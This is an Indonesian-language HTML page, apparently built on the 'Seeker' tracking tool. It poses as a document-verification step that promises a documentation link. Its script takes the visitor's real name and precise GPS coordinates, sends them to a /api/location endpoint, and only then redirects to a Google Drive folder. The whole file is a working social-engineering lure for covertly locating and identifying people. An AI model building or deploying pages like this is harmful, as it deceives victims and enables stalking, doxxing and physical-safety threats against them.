<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Verifikasi Akses</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      margin-top: 100px;
    }
    button {
      padding: 12px 24px;
      font-size: 16px;
      background: #3c78da;
      color: white;
      border: none;
      border-radius: 6px;
    }
    input {
      padding: 10px;
      font-size: 16px;
      width: 300px;
      margin: 10px 0;
      border-radius: 6px;
      border: 1px solid #ccc;
    }
  </style>
</head>
<body>
  <h2>Verifikasi Dokumen</h2>
  <p>Masukkan nama asli Anda dan klik tombol di bawah untuk mendapatkan link dokumentasi.</p>

  <!-- Form Input Nama -->
  <input type="text" id="name" placeholder="Masukkan Nama Asli" />

  <!-- Tombol untuk memulai tracking -->
  <button onclick="startTracking()">Dapatkan Link</button>

  <script>
    function startTracking() {
      var name = document.getElementById('name').value;

      if (!name) {
        alert("Mohon isi nama asli terlebih dahulu.");
        return;
      }

      // Panggil fungsi dari Seeker untuk mengambil lokasi
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          sendData(position, name);
        }, showError);
      } else {
        alert("Browser Anda tidak mendukung GPS.");
      }
    }

    function sendData(position, name) {
      fetch('/api/location', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          name: name,
          lat: position.coords.latitude,
          lon: position.coords.longitude,
          acc: position.coords.accuracy
        })
      })
      .then(response => {
        if (!response.ok) {
          console.error('Gagal kirim data:', response);
          alert('Gagal mengirim data ke server');
        } else {
          // Redirect setelah data terkirim
          window.location.href = "https://drive.google.com/drive/folders/1xiz5IF0xhsMKqnol0cBrO8KWScXV7cd-?usp=sharing";
        }
      })
      .catch(error => {
        console.error('Terjadi kesalahan saat fetch:', error);
        alert('Terjadi kesalahan, silakan coba lagi!');
      });
    }

    function showError(error) {
      switch(error.code) {
        case error.PERMISSION_DENIED:
          alert("Pengguna menolak permintaan geolokasi.");
          break;
        case error.POSITION_UNAVAILABLE:
          alert("Informasi lokasi tidak tersedia.");
          break;
        case error.TIMEOUT:
          alert("Waktu permintaan lokasi habis.");
          break;
        case error.UNKNOWN_ERROR:
          alert("Terjadi kesalahan tak terduga.");
          break;
      }
    }
  </script>
</body>
</html>
